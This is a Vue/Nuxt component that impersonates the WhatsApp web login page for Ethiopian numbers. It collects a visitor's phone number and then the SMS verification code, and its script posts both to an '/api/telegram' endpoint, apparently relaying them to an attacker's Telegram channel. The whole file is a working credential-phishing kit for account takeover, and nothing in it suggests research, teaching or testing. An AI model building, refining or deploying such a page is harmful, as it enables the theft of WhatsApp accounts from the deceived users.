<script setup lang="ts">
const countryOptions = ['Ethiopia']

const currentStep = ref<'phone' | 'verify'>('phone')
const selectedCountry = ref(countryOptions[0])
const phoneNumber = ref('+251')
const submittedPhoneNumber = ref('+251')
const verificationCode = ref('')
const phoneStatus = ref('')
const codeStatus = ref('')
const isSendingPhone = ref(false)
const isSendingCode = ref(false)

async function sendToTelegram(event: 'phone_submitted' | 'code_submitted') {
  return await $fetch<{
    ok: boolean
    configured: boolean
    message?: string
  }>('/api/telegram', {
    method: 'POST',
    body: {
      event,
      country: selectedCountry.value,
      phoneNumber: phoneNumber.value,
      verificationCode: event === 'code_submitted' ? verificationCode.value : undefined
    }
  })
}

async function goToVerifyPage() {
  const trimmedPhone = phoneNumber.value.trim()

  if (!trimmedPhone) {
    phoneStatus.value = 'Enter a phone number first.'
    return
  }

  phoneStatus.value = ''
  isSendingPhone.value = true
  phoneNumber.value = trimmedPhone

  try {
    const response = await sendToTelegram('phone_submitted')

    if (!response.ok) {
      phoneStatus.value = response.message ?? 'Telegram is not configured yet.'
      return
    }
  } catch (error) {
    phoneStatus.value = error instanceof Error ? error.message : 'Could not send the phone number right now.'
    return
  } finally {
    isSendingPhone.value = false
  }

  submittedPhoneNumber.value = trimmedPhone
  currentStep.value = 'verify'
}

function goBackToPhonePage() {
  codeStatus.value = ''
  currentStep.value = 'phone'
}

async function submitVerificationCode() {
  const trimmedCode = verificationCode.value.trim()

  if (!trimmedCode) {
    codeStatus.value = 'Enter the verification code first.'
    return
  }

  verificationCode.value = trimmedCode
  codeStatus.value = ''
  isSendingCode.value = true

  try {
    const response = await sendToTelegram('code_submitted')

    codeStatus.value = response.ok
      ? 'Code sent to Telegram.'
      : (response.message ?? 'Telegram is not configured yet.')
  } catch (error) {
    codeStatus.value = error instanceof Error ? error.message : 'Could not send the verification code right now.'
  } finally {
    isSendingCode.value = false
  }
}
</script>

<template>
  <div class="page-shell" :class="{ 'page-shell--verify': currentStep === 'verify' }">
    <NuxtRouteAnnouncer />

    <template v-if="currentStep === 'phone'">
      <header class="brand-bar">
        <div class="brand">
          <span class="brand__icon" aria-hidden="true">
            <svg viewBox="0 0 32 32" role="img">
              <path
                d="M16 3C9.37 3 4 8.19 4 14.58c0 2.53.84 4.88 2.27 6.79L4.8 29l7.93-2.06a12.3 12.3 0 0 0 3.27.44c6.63 0 12-5.19 12-11.58S22.63 3 16 3Z"
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2.2"
              />
              <path
                d="M12.34 11.12c.31-.65.64-.67.95-.68h.81c.24 0 .57.09.76.5.19.42.65 1.6.71 1.72.06.11.1.25.02.4-.07.16-.12.25-.24.38-.12.12-.25.27-.35.37-.12.12-.25.25-.1.5.14.25.64 1.03 1.38 1.67.95.82 1.75 1.07 2 1.18.25.11.4.09.55-.06.14-.15.59-.67.75-.9.16-.23.32-.19.54-.11.22.08 1.41.66 1.66.78.25.13.41.19.47.29.06.11.06.61-.14 1.2-.2.59-1.2 1.14-1.63 1.2-.42.06-.95.09-1.54-.1-.36-.11-.82-.27-1.41-.52-.86-.36-1.6-.95-2.31-1.64-.58-.56-1.1-1.2-1.51-1.9-.44-.77-.73-1.64-.73-2.48 0-.85.43-1.42.58-1.62Z"
                fill="currentColor"
              />
            </svg>
          </span>
          <span class="brand__name">WhatsApp</span>
        </div>
      </header>

      <main class="content">
        <section class="download-card">
          <div class="download-card__icon" aria-hidden="true">
            <svg viewBox="0 0 80 64" role="img">
              <rect x="20" y="12" width="40" height="26" rx="4" fill="#d9f6d6" stroke="#1f1f1f" stroke-width="2" />
              <path d="M14 42h52" stroke="#1f1f1f" stroke-width="2" stroke-linecap="round" />
              <path d="M29 42v7h22v-7" fill="#d9f6d6" stroke="#1f1f1f" stroke-width="2" stroke-linejoin="round" />
              <rect x="31" y="6" width="18" height="18" rx="4" fill="#25d366" stroke="#1f1f1f" stroke-width="2" />
              <path
                d="M40 10.5c-3.1 0-5.5 2.36-5.5 5.27 0 1.15.39 2.22 1.05 3.08l-.68 3.45 3.57-.93c.5.14 1.02.21 1.56.21 3.1 0 5.5-2.36 5.5-5.27s-2.4-5.81-5.5-5.81Z"
                fill="#fff"
              />
              <path
                d="M38.74 13.75c.16-.34.33-.35.49-.35h.42c.12 0 .29.04.39.26.1.22.33.82.37.88.03.06.05.13.01.21-.04.08-.06.13-.12.19l-.18.19c-.06.06-.13.13-.05.26.07.13.33.53.71.86.49.42.91.55 1.04.61.13.06.21.05.29-.03.07-.08.3-.34.38-.46.08-.12.17-.1.28-.05.11.04.73.34.86.4.13.07.21.1.24.15.03.06.03.31-.07.62-.1.3-.62.58-.84.61-.22.03-.49.04-.8-.05a5.43 5.43 0 0 1-.73-.27 7.21 7.21 0 0 1-1.2-.86 5.7 5.7 0 0 1-.78-.99 2.98 2.98 0 0 1-.38-1.29c0-.44.22-.74.3-.84Z"
                fill="#25d366"
              />
            </svg>
          </div>

          <div class="download-card__copy">
            <h2>Download WhatsApp for Windows</h2>
            <p>Get extra features like voice and video calling, screen sharing and more.</p>
          </div>

          <button class="download-card__button" type="button">
            <span>Download</span>
            <svg viewBox="0 0 24 24" aria-hidden="true">
              <path
                d="M12 4v9m0 0 3.5-3.5M12 13 8.5 9.5M5 16.5v1A1.5 1.5 0 0 0 6.5 19h11a1.5 1.5 0 0 0 1.5-1.5v-1"
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="1.9"
              />
            </svg>
          </button>
        </section>

        <section class="login-card">
          <h1>Enter phone number</h1>
          <p class="login-card__subtitle">Select a country and enter your phone number.</p>

          <form class="login-form" @submit.prevent="goToVerifyPage">
            <label class="sr-only" for="country">Country</label>
            <div class="field field--select">
              <span class="field__flag" aria-hidden="true">🇪🇹</span>
              <select id="country" v-model="selectedCountry">
                <option v-for="country in countryOptions" :key="country" :value="country">
                  {{ country }}
                </option>
              </select>
              <span class="field__chevron" aria-hidden="true">
                <svg viewBox="0 0 24 24">
                  <path d="m7 10 5 5 5-5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" />
                </svg>
              </span>
            </div>

            <label class="sr-only" for="phone">Phone number</label>
            <input
              id="phone"
              v-model="phoneNumber"
              class="field"
              type="tel"
              inputmode="tel"
              placeholder="+251 96 983 3484"
            />

            <button class="next-button" type="submit" :disabled="isSendingPhone">
              {{ isSendingPhone ? 'Sending...' : 'Next' }}
            </button>
          </form>

          <p v-if="phoneStatus" class="status-copy">{{ phoneStatus }}</p>

          <a class="qr-link" href="/">
            <span>Log in with QR code</span>
            <svg viewBox="0 0 24 24" aria-hidden="true">
              <path d="m9 6 6 6-6 6" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" />
            </svg>
          </a>
        </section>

        <footer class="page-footer">
          <p class="signup-copy">
            Don't have a WhatsApp account?
            <a href="/">Get started</a>
          </p>

          <p class="security-copy">
            <svg viewBox="0 0 24 24" aria-hidden="true">
              <path
                d="M8 10V7a4 4 0 1 1 8 0v3m-9 0h10a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1v-8a1 1 0 0 1 1-1Z"
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="1.8"
              />
            </svg>
            <span>Your personal messages are end-to-end encrypted</span>
          </p>
        </footer>
      </main>
    </template>

    <main v-else class="verify-screen">
      <section class="verify-panel">
        <h1>Verifying your number</h1>

        <p class="verify-copy">
          <span>SMS sent to</span>
          <strong>{{ submittedPhoneNumber }}</strong>.
          <button class="verify-copy__link" type="button" @click="goBackToPhonePage">Wrong number?</button>
        </p>

        <form class="verify-form" @submit.prevent="submitVerificationCode">
          <div class="code-area">
            <label class="sr-only" for="verification-code">Verification code</label>
            <input
              id="verification-code"
              v-model="verificationCode"
              class="code-input"
              type="text"
              inputmode="numeric"
              maxlength="6"
              placeholder="— — —   — — —"
            />
            <div class="code-underline" aria-hidden="true" />
          </div>

          <button class="verify-button" type="submit" :disabled="isSendingCode">
            {{ isSendingCode ? 'Sending...' : 'Submit code' }}
          </button>
        </form>

        <p v-if="codeStatus" class="status-copy status-copy--verify">{{ codeStatus }}</p>

        <button class="help-link" type="button">Didn't receive code?</button>
      </section>
    </main>
  </div>
</template>

<style scoped>
:global(body) {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  color: #111b21;
  background: #fff;
}

:global(*) {
  box-sizing: border-box;
}

:global(button),
:global(input),
:global(select) {
  font: inherit;
}

.page-shell {
  min-height: 100vh;
  padding: 18px 24px 10px;
  background: #f7efe1;
}

.page-shell--verify {
  padding: 0;
  background: #fff;
}

.brand-bar {
  margin-bottom: 22px;
}

.brand {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  color: #25d366;
}

.brand__icon {
  width: 24px;
  height: 24px;
  display: inline-flex;
}

.brand__icon svg {
  width: 100%;
  height: 100%;
}

.brand__name {
  font-size: 16px;
  font-weight: 700;
  letter-spacing: -0.02em;
}

.content {
  width: min(100%, 706px);
  margin: 0 auto;
}

.download-card,
.login-card {
  background: #fff;
  border: 1.5px solid #1f1f1f;
  border-radius: 22px;
}

.download-card {
  display: grid;
  grid-template-columns: auto 1fr auto;
  align-items: center;
  gap: 18px;
  padding: 18px 28px;
  margin-bottom: 14px;
}

.download-card__icon {
  width: 64px;
  height: 50px;
}

.download-card__icon svg {
  width: 100%;
  height: 100%;
}

.download-card__copy h2 {
  margin: 0 0 6px;
  font-size: 15px;
  font-weight: 400;
}

.download-card__copy p {
  margin: 0;
  max-width: 410px;
  font-size: 14px;
  line-height: 1.35;
}

.download-card__button {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  min-width: 130px;
  padding: 12px 22px;
  border: 1.5px solid #1f1f1f;
  border-radius: 999px;
  background: #25d366;
  color: #111b21;
  cursor: pointer;
}

.download-card__button svg {
  width: 16px;
  height: 16px;
}

.login-card {
  padding: 34px 24px 38px;
  text-align: center;
}

.login-card h1 {
  margin: 0;
  font-size: clamp(32px, 4vw, 36px);
  font-weight: 400;
  letter-spacing: -0.04em;
}

.login-card__subtitle {
  margin: 8px 0 28px;
  font-size: 14px;
}

.login-form {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 14px;
}

.field {
  width: min(100%, 258px);
  height: 42px;
  padding: 0 18px;
  border: 1.5px solid #1f1f1f;
  border-radius: 999px;
  background: #fff;
  color: #111b21;
}

.field::placeholder {
  color: #667781;
}

.field--select {
  position: relative;
  display: flex;
  align-items: center;
  padding-left: 18px;
}

.field--select select {
  width: 100%;
  height: 100%;
  padding: 0 40px 0 20px;
  border: 0;
  background: transparent;
  appearance: none;
  color: inherit;
}

.field__flag {
  font-size: 16px;
  line-height: 1;
}

.field__chevron {
  position: absolute;
  right: 18px;
  width: 16px;
  height: 16px;
  pointer-events: none;
}

.field__chevron svg {
  width: 100%;
  height: 100%;
}

.next-button {
  margin-top: 32px;
  min-width: 62px;
  padding: 10px 20px;
  border: 0;
  border-radius: 999px;
  background: #25d366;
  color: #fff;
  font-size: 13px;
  font-weight: 700;
  cursor: pointer;
}

.next-button:disabled,
.verify-button:disabled {
  cursor: wait;
  opacity: 0.75;
}

.status-copy {
  margin: 16px auto 0;
  width: min(100%, 320px);
  color: #667781;
  font-size: 13px;
  line-height: 1.4;
}

.qr-link {
  margin-top: 20px;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  color: #111b21;
  font-size: 14px;
  text-underline-offset: 3px;
}

.qr-link svg {
  width: 14px;
  height: 14px;
}

.page-footer {
  padding: 28px 16px 0;
  text-align: center;
}

.signup-copy {
  margin: 0 0 18px;
  font-size: 15px;
}

.signup-copy a {
  color: inherit;
  text-underline-offset: 3px;
}

.security-copy {
  margin: 0;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  color: #667781;
  font-size: 13px;
}

.security-copy svg {
  width: 14px;
  height: 14px;
}

.verify-screen {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  padding: 56px 24px;
  background: #fff;
}

.verify-panel {
  width: min(100%, 620px);
  text-align: center;
}

.verify-panel h1 {
  margin: 0 0 56px;
  font-size: clamp(40px, 6vw, 64px);
  font-weight: 300;
  letter-spacing: -0.06em;
}

.verify-copy {
  margin: 0 auto 86px;
  max-width: 560px;
  color: #667781;
  font-size: clamp(22px, 3vw, 30px);
  line-height: 1.35;
}

.verify-copy strong {
  color: #111b21;
  font-weight: 700;
}

.verify-copy__link {
  padding: 0;
  border: 0;
  background: transparent;
  color: #1b6fb8;
  font-size: inherit;
  font-weight: 600;
  cursor: pointer;
}

.code-area {
  width: min(100%, 485px);
  margin: 0 auto 130px;
}

.verify-form {
  display: flex;
  flex-direction: column;
  align-items: center;
}

.code-input {
  width: 100%;
  border: 0;
  background: transparent;
  color: #5f6b73;
  text-align: center;
  font-size: clamp(34px, 5vw, 56px);
  letter-spacing: 0.2em;
  outline: none;
}

.code-input::placeholder {
  color: #5f6b73;
  opacity: 1;
}

.code-underline {
  margin-top: 18px;
  border-bottom: 6px solid #d6d7d9;
}

.verify-button {
  min-width: 140px;
  padding: 12px 22px;
  border: 0;
  border-radius: 999px;
  background: #25d366;
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
}

.status-copy--verify {
  margin-top: 18px;
  margin-bottom: 42px;
  font-size: 16px;
}

.help-link {
  padding: 0;
  border: 0;
  background: transparent;
  color: #1f9d84;
  font-size: clamp(22px, 3vw, 28px);
  font-weight: 400;
  cursor: pointer;
}

.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}

@media (max-width: 760px) {
  .page-shell {
    padding: 18px 16px 28px;
  }

  .download-card {
    grid-template-columns: 1fr;
    justify-items: start;
    padding: 20px;
  }

  .download-card__button {
    width: 100%;
  }

  .login-card {
    padding: 30px 18px 34px;
  }

  .login-card h1 {
    font-size: 28px;
  }

  .verify-screen {
    padding: 40px 20px 56px;
  }

  .verify-panel h1 {
    margin-bottom: 40px;
  }

  .verify-copy {
    margin-bottom: 64px;
  }

  .code-area {
    margin-bottom: 96px;
  }

  .code-underline {
    border-bottom-width: 4px;
  }
}
</style>
